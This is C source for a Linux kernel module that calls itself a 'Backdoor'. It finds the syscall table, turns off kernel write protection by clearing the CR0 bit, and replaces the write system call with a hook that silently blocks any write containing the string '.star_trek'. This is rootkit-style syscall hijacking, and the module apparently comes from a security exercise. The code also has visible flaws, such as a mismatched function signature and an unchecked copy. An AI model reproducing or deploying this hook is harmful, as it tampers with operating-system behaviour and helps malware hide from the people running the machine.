#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

void **sys_call_table_addr;
asmlinkage ssize_t (*real_write)(int fd, const char __user *buf, ssize_t count);

/* Our modified write syscall. */
static ssize_t sneaky_write(int fd, const void *buf, size_t count)
{
    ssize_t ret;
    char *p;

    char *key = ".star_trek";
    char *kbuf = (char *) kmalloc(256, GFP_KERNEL);
    copy_from_user(kbuf, buf, 255 - 1);
    
    if (p = strstr(kbuf, key)) {
        kfree(kbuf);

        printk("Skipping hidden file.\n");
        return EEXIST;
    }  
    
    ret = (*real_write)(fd, buf, count);
    kfree(kbuf);   

    return ret;
}

/* Adds our backdoor syscall to the syscall table. */
static int backdoor_init(void)
{
    printk("Inserting backdoor module...\n");

    /* Get syscall table addr. */
    sys_call_table_addr = (void **)kallsyms_lookup_name("sys_call_table");
    if (!sys_call_table_addr)    
        return -EFAULT;

    printk("sys_call_table_addr is at: %p\n", sys_call_table_addr);

    /*
     * The syscall table is in read-only memory pages, so we turn off read-only
     * protection first, which is controlled by the CR0 register.
     */
    preempt_disable();  // Don't want others messing around w/ read-only off
    write_cr0(read_cr0() & ~0x10000);
    
    real_write = sys_call_table_addr[1];
    sys_call_table_addr[1] = sneaky_write;

    write_cr0(read_cr0() | 0x10000);
    preempt_enable();

    return 0;
}

static void backdoor_exit(void)
{
    preempt_disable();  // Don't want others messing around w/ read-only off
    write_cr0(read_cr0() & ~0x10000);
    
    sys_call_table_addr[1] = real_write;

    write_cr0(read_cr0() | 0x10000);
    preempt_enable();

    printk("Removing backdoor module...\n");
} 

module_init(backdoor_init);
module_exit(backdoor_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Backdoor");
MODULE_AUTHOR("jg3949");
